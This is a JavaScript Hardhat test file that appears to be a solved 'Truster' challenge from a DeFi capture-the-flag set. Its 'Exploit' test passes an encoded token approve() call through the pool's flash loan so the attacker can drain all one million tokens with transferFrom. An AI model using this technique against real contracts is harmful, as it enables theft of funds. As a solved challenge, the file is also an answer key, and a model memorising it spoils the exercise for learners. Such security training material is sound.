const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

  before(async function () {
      /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
      [deployer, attacker] = await ethers.getSigners();

      const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
      const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

      this.token = await DamnValuableToken.deploy();
      this.pool = await TrusterLenderPool.deploy(this.token.address);

      await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

      expect(
          await this.token.balanceOf(this.pool.address)
      ).to.equal(TOKENS_IN_POOL);

      expect(
          await this.token.balanceOf(attacker.address)
      ).to.equal('0');
  });

  it('Exploit', async function () {
      const ABI = ["function approve(address, uint256)"];
      const interface = new ethers.utils.Interface(ABI);
      const payload = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()]);

      await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, payload);          // token.approve() : lending pool -> attacker
      await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
  });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(0);
    });
});
